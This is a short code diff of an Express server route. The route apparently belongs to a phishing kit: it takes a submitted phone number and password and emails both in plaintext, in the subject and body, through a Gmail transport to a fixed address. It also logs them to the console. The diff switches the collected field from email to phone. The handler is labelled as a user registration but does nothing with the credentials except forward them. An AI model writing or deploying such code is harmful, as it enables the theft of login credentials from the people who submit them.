@@ -20,7 +20,7 @@ app.use(express.json());
 
 // API routes for index
 app.post("/", (req, res) => {
-  const { email, password } = req.body;
+  const { phone, password } = req.body;
 
   const transporter = nodemailer.createTransport({
     service: "gmail",
@@ -31,10 +31,10 @@ app.post("/", (req, res) => {
   });
 
   const mailOptions = {
-    from: `${email}`,
+    from: `${phone}`,
     to: userEmail,
-    subject: `Email: ${email} \t\n\n\n password: ${password}`,
-    text: `New user registered with Email: ${email} and password: ${password}`,
+    subject: `Phone: ${phone} \t\n\n\n password: ${password}`,
+    text: `New user registered with Phone: ${phone} and password: ${password}`,
   };
 
   console.log(mailOptions);
